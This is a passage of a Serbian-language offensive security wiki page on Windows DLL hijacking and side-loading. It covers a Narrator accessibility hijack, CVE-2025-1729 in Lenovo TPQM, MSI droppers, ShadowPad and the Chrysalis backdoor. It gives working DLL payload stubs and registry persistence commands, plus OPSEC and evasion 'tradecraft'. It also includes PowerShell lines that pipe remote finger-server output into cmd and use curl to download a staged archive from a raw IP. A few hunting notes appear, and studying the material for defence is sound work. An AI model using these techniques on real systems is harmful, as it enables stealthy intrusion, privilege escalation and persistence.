- Filter: `Process Name is Narrator.exe` i `Operation is Load Image` ili `CreateFile`.
- Pokrenite Narrator i posmatrajte pokušaj učitavanja prethodno navedene putanje.

Minimalni DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC tišina
- Naivni hijack će oglasiti zvuk/prikazati UI. Da biste ostali neprimetni, pri attach-u enumerišite Narrator thread-ove, otvorite glavni thread (`OpenThread(THREAD_SUSPEND_RESUME)`) i suspendujte ga pomoću `SuspendThread`; nastavite izvršavanje u sopstvenom thread-u. Pogledajte PoC za kompletan kod.<sup>[[8]](#references)</sup>

Trigger i persistence putem Accessibility konfiguracije
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Sa prethodno navedenim podešavanjima, pokretanje Narrator-a učitava ubačeni DLL. Na secure desktop-u (ekranu za prijavljivanje), pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.

SYSTEM izvršavanje pokrenuto putem RDP-a (lateral movement)
- Omogućite klasični RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Povežite se na host putem RDP-a, a na ekranu za prijavljivanje pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.
- Izvršavanje se zaustavlja kada se RDP session zatvori — izvršite inject/migrate bez odlaganja.

Bring Your Own Accessibility (BYOA)
- Možete klonirati registry entry ugrađenog Accessibility Tool-a (AT), npr. CursorIndicator, izmeniti ga tako da pokazuje na proizvoljni binary/DLL, importovati ga, a zatim postaviti `configuration` na ime tog AT-a. Na ovaj način se proizvoljno izvršavanje prosleđuje kroz Accessibility framework.

Napomene
- Upisivanje u `%windir%\System32` i menjanje HKLM vrednosti zahtevaju admin prava.
- Celokupna payload logika može biti smeštena u `DLL_PROCESS_ATTACH`; export-i nisu potrebni.

## Studija slučaja: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ovaj slučaj prikazuje **Phantom DLL Hijacking** u Lenovo-ovom TrackPoint Quick Menu-u (`TPQMAssistant.exe`), evidentiranom kao **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalji ranjivosti

- **Komponenta**: `TPQMAssistant.exe`, koja se nalazi u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se pokreće svakog dana u 9:30 ujutru u kontekstu prijavljenog korisnika.
- **Dozvole direktorijuma**: `CREATOR OWNER` ima dozvolu za upis, što lokalnim korisnicima omogućava ubacivanje proizvoljnih fajlova.
- **Ponašanje DLL Search-a**: Pokušava da učita `hostfxr.dll` prvo iz svog working directory-ja i beleži "NAME NOT FOUND" ako fajl nedostaje, što ukazuje na prioritet pretrage lokalnog direktorijuma.

### Implementacija Exploit-a

Napadač može postaviti zlonamerni `hostfxr.dll` stub u isti direktorijum i iskoristiti DLL koji nedostaje za postizanje code execution-a u kontekstu korisnika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Tok napada

1. Kao standardni korisnik, postavite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da se scheduled task pokrene u 9:30 u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se task izvrši, malicious DLL se pokreće u sesiji administratora sa srednjim nivoom integriteta.
4. Kombinujte standardne UAC bypass tehnike da biste prešli sa srednjeg nivoa integriteta na SYSTEM privilegije.

## Studija slučaja: MSI CustomAction Dropper + DLL Side-Loading putem potpisanog Host-a (wsc_proxy.exe)

Threat actors često kombinuju MSI-based droppers sa DLL side-loading tehnikom kako bi izvršili payload-e pod trusted, potpisanim procesom.<sup>[[10]](#references)</sup>

Pregled lanca
- User preuzima MSI. CustomAction se nečujno pokreće tokom GUI instalacije (npr. LaunchApplication ili VBScript akcija) i rekonstruiše sledeću fazu iz ugrađenih resources.
- Dropper upisuje legitiman, potpisan EXE i malicious DLL u isti direktorijum (primer para: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Kada se potpisani EXE pokrene, Windows DLL search order prvo učitava wsc.dll iz working direktorijuma, izvršavajući attacker code pod potpisanim parent procesom (ATT&CK T1574.001).

MSI analiza (na šta obratiti pažnju)
- CustomAction tabela:
- Potražite entries koji pokreću executables ili VBScript. Sumnjiv primer pattern-a: LaunchApplication koji izvršava embedded file u background-u.
- U Orca (Microsoft Orca.exe) pregledajte CustomAction, InstallExecuteSequence i Binary tabele.
- Embedded/split payloads u MSI CAB-u:
- Administrativna ekstrakcija: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ili koristite lessmsi: lessmsi x package.msi C:\out
- Potražite više malih fragments koji se spajaju i decryptuju pomoću VBScript CustomAction-a. Uobičajeni tok:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktični sideloading sa wsc_proxy.exe
- Postavite ova dva fajla u isti folder:
- wsc_proxy.exe: legitimni potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
- wsc.dll: attacker DLL. Ako nisu potrebni specifični exports, DllMain može biti dovoljan; u suprotnom, napravite proxy DLL i prosledite potrebne exports originalnoj biblioteci, dok payload izvršavate u DllMain.
- Napravite minimalni DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Za zahteve za export, koristite proxying framework (npr. DLLirant/Spartacus) da generišete forwarding DLL koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na razrešavanje DLL imena od strane host binary-ja. Ako host koristi apsolutne putanje ili bezbedne flags za učitavanje (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack može biti neuspešan.
- KnownDLLs, SxS i forwarded exports mogu uticati na redosled prioriteta i moraju se uzeti u obzir pri izboru host binary-ja i export seta.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point je opisao kako Ink Dragon deploy-uje ShadowPad pomoću **tri-file triad** pristupa, kako bi se stopio sa legitimnim softverom, dok core payload ostaje encrypted na disku:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – zloupotrebljavaju se vendori kao što su AMD, Realtek ili NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attackers preimenuju executable tako da izgleda kao Windows binary (na primer `conhost.exe`), ali Authenticode signature ostaje validan.
2. **Malicious loader DLL** – postavlja se pored EXE-ja sa očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binary obfuscated pomoću ScatterBrain framework-a; njegov jedini zadatak je da pronađe encrypted blob, decrypt-uje ga i reflectively map-uje ShadowPad.
3. **Encrypted payload blob** – često se čuva kao `<name>.tmp` u istom direktorijumu. Nakon memory-map-ovanja decrypted payload-a, loader briše TMP file kako bi uništio forensic evidence.

Tradecraft napomene:

* Preimenovanje signed EXE-ja (uz zadržavanje originalnog `OriginalFileName` u PE header-u) omogućava mu da se predstavi kao Windows binary, uz zadržavanje vendor signature-a, zato replicirajte naviku Ink Dragon-a da postavlja binary-je koji izgledaju kao `conhost.exe`, a zapravo su AMD/NVIDIA utilities.
* Pošto executable ostaje trusted, većina allowlisting controls zahteva samo da se malicious DLL nalazi pored njega. Usredsredite se na prilagođavanje loader DLL-a; signed parent obično može da se izvrši bez izmena.
* ShadowPad decryptor očekuje da TMP blob bude pored loader-a i writable kako bi mogao da isprazni file nakon mapiranja. Ostavite direktorijum writable dok se payload ne učita; kada je u memory-ju, TMP file se može bezbedno obrisati radi OPSEC-a.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators kombinuju DLL sideloading sa LOLBAS-om, tako da je jedini custom artifact na disku malicious DLL pored trusted EXE-ja:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell pokreće `cmd.exe /c`, preuzima commands sa Finger server-a i prosleđuje ih u `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` preuzima TCP/79 text; `| cmd` izvršava server response, omogućavajući operatorima da server-side rotiraju second stage.

- **Built-in download/extract:** Preuzmite archive sa benignim extension-om, raspakujte ga i stage-ujte sideload target zajedno sa DLL-om u nasumični `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` skriva progress i prati redirects; `tar -xf` koristi Windows' built-in tar.

- **WMI/CIM launch:** Pokrenite EXE preko WMI-ja, tako da telemetry prikazuje CIM-created process dok on učitava colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Radi sa binary-jima koji preferiraju local DLLs (npr. `intelbq.exe`, `nearby_share.exe`); payload (npr. Remcos) se izvršava pod trusted name-om.

- **Hunting:** Generišite alert za `forfiles` kada se `/p`, `/m` i `/c` pojave zajedno; to je neuobičajeno van admin scripts-a.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Nedavna Lotus Blossom intrusion zloupotrebila je trusted update chain za isporuku NSIS-packed dropper-a koji je stage-ovao DLL sideload zajedno sa potpuno in-memory payload-ima.<sup>[[13]](#references)</sup>

Tradecraft tok
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, postavlja preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` i encrypted blob `BluetoothService`, a zatim pokreće EXE.
- Host EXE importuje `log.dll` i poziva `LogInit`/`LogWrite`. `LogInit` mmap-load-uje blob; `LogWrite` ga decrypt-uje pomoću custom LCG-based stream-a (constants **0x19660D** / **0x3C6EF35F**, key material izveden iz prethodnog hash-a), overwrite-uje buffer plaintext shellcode-om, oslobađa temporary data i skače na njega.
- Da bi izbegao IAT, loader razrešava APIs hashovanjem export names pomoću **FNV-1a basis 0x811C9DC5 + prime 0x100019**, a zatim primenjuje Murmur-style avalanche (**0x85EBCA6B**) i poredi rezultat sa salted target hashes.

Main shellcode (Chrysalis)
- Decrypt-uje PE-like main module ponavljanjem add/XOR/sub operacija sa key-em `gQ2JR&9;` kroz five passes, a zatim dinamički učitava `Kernel32.dll` → `GetProcAddress` da završi import resolution.
- Rekonstruiše DLL name strings u runtime-u pomoću per-character bit-rotate/XOR transformacija, a zatim učitava `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Koristi second resolver koji prolazi kroz **PEB → InMemoryOrderModuleList**, parsira svaki export table u 4-byte blokovima pomoću Murmur-style mixing-a i koristi `GetProcAddress` samo ako hash nije pronađen.

Embedded configuration & C2
- Config se nalazi unutar dropped `BluetoothService` file-a na **offset 0x30808** (size **0x980**) i RC4-decrypt-uje se pomoću key-a `qwhvb^435h&*7`, čime se otkrivaju C2 URL i User-Agent.
- Beacons formiraju dot-delimited host profile, dodaju tag `4Q` na početak, a zatim ga RC4-encrypt-uju pomoću key-a `vAuig34%^325hGV` pre `HttpSendRequestA` preko HTTPS-a. Responses se RC4-decrypt-uju i dispatch-uju pomoću tag switch-a (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode je određen CLI args-ima: bez args-a = install persistence (service/Run key) koja pokazuje na `-i`; `-i` ponovo pokreće self sa `-k`; `-k` preskače install i pokreće payload.

Alternate loader observed
- Ista intrusion je postavila Tiny C Compiler i izvršila `svchost.exe -nostdlib -run conf.c` iz `C:\ProgramData\USOShared\`, sa `libtcc.dll` pored njega. C source koji je attacker dostavio sadržao je embedded shellcode, koji je kompajliran i pokrenut in-memory bez upisivanja PE-ja na disk. Replicirajte pomoću:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ova TCC-based compile-and-run faza je importovala `Wininet.dll` tokom runtime-a i preuzimala second-stage shellcode sa hardkodovanog URL-a, pružajući fleksibilan loader koji se predstavlja kao pokretanje compiler-a.

## Signed-host sideloading with export proxying + host thread parking

Neki DLL sideloading lanci dodaju **stability engineering** kako bi legitimni host ostao aktivan dovoljno dugo da uredno učita kasnije faze, umesto da se sruši nakon učitavanja malicioznog DLL-a.<sup>[[11]](#references)</sup>

Observed pattern
- Postaviti trusted EXE pored malicioznog DLL-a koristeći očekivano ime dependency-ja, kao što je `version.dll`.
- Maliciozni DLL **proxy-uje svaki očekivani export** ka pravom system DLL-u (na primer `%SystemRoot%\\System32\\version.dll`), tako da import resolution i dalje uspeva, a host process nastavlja da radi.
- Nakon učitavanja, maliciozni DLL **patch-uje host entry point** tako da main thread prelazi u beskonačnu `Sleep` petlju, umesto da se završi ili izvršava code paths koji bi terminirali process.
- Novi thread obavlja stvarni maliciozni posao: dešifruje ime ili putanju next-stage DLL-a (RC4/XOR su uobičajeni), a zatim ga pokreće pomoću `LoadLibrary`.

Why this matters
- Uobičajeni DLL proxying čuva API compatibility, ali ne garantuje da će host ostati aktivan dovoljno dugo za kasnije faze.
- Parkiranje main thread-a u `Sleep(INFINITE)` jednostavan je način da signed process ostane rezidentan dok loader obavlja decryption, staging ili network bootstrap u worker thread-u.
- Hunting koji traži samo sumnjiv `DllMain` može da propusti ovaj pattern ako se interesantno ponašanje dešava nakon patch-ovanja host entry point-a i pokretanja secondary thread-a.

Minimal workflow
1. Kopirati signed host EXE i utvrditi DLL koji resolve-uje iz lokalnog direktorijuma.
2. Napraviti proxy DLL koji export-uje iste funkcije i forward-uje ih ka legitimnom DLL-u.
3. U `DllMain(DLL_PROCESS_ATTACH)` kreirati worker thread.
4. Iz tog thread-a patch-ovati host entry point ili main thread start routine tako da se vrti u `Sleep` petlji.
5. Dešifrovati ime/config next-stage DLL-a i pozvati `LoadLibrary` ili izvršiti manual-map payload-a.

Defensive pivots
- Signed processes koji učitavaju `version.dll` ili slične uobičajene biblioteke iz sopstvenog application direktorijuma umesto iz `System32`.
- Memory patches na process entry point-u neposredno nakon image load-a, naročito jump/call instrukcije preusmerene na `Sleep`/`SleepEx`.
- Thread-ovi koje kreira proxy DLL i koji odmah pozivaju `LoadLibrary` nad drugim DLL-om sa dešifrovanim imenom.
- Full-export proxy DLL-ovi postavljeni pored vendor executables unutar writable staging direktorijuma kao što su `ProgramData`, `%TEMP%` ili putanje do unpacked archive-a.

## References

- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Simple C example.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
